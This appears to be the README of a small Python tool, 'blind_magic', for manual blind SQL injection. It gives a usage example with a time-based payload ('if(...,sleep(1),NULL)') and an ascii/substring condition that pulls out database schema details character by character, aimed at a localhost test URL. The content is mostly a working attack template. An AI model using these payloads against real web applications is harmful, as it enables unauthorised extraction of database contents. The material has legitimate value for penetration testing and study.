# blind_magic 0.1.3  
Manual Blind SQL Injection  
  
Some trick:  
I supply to you 5 loop variables l1 to l4 {l1} {l2} {l3} {l4}  
  
Blind query statament:  
{CONDITION_QUERY}  
{QUERY}  
{OPERATOR}  
{CHAR}  
  
example:  
b = Blind_magic()  
b.set_l1(1,10)  
b.set_l2(0,1)  
b.url = "http://localhost/test_site/?q="  
b.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"  
b.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"  
b.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"  
b.run()  
print b.result  
